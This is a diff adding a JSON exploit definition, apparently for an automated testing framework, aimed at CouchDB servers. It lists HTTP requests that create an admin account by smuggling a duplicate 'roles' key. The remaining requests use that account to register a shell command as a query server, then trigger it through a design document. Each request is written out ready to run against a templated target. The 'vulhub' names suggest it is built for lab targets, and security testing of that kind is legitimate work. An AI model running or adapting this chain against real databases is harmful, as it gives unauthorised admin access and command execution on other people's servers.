@@ -1,0 +1,13 @@
+{
+"name": "couchdb",
+"remote_host": "{{.RHOST}}",
+"remote_port": "5984",
+"http_exploit": [{"uri": "/_users/org.couchdb.user:vulhub", "method": "put", "data": "{\"type\":\"user\", \"name\": \"vulhub\", \"roles\": [\"_admin\"], \"roles\": [], \"password\":\"vulhub\"}"}],
+"http_payload":[
+	{"uri": "http://vulhub:vulhub@{{.RHOST}}:{{.RPORT}}/_node/nonode@nohost/_config/query_servers/cmd", "method": "put", "data": "\"cat /etc/hosts >/tmp/hosts\""},
+	{"uri": "http://vulhub:vulhub@{{.RHOST}}:{{.RPORT}}/vultest", "method": "put"},
+	{"uri": "http://vulhub:vulhub@{{.RHOST}}:{{.RPORT}}/vultest/vul", "method":"put", "data":"{\"_id\":\"770895a97726d5ca6d70a22173005c7b\"}"},
+	{"uri": "http://vulhub:vulhub@{{.RHOST}}:{{.RPORT}}/vultest/_design/vul", "method":"put", "data":"{\"_id\":\"_design/test\",\"views\":{\"wooyun\":{\"map\":\"\"}},\"language\":\"cmd\"}"}
+],
+"reverse_shell": false 
+}
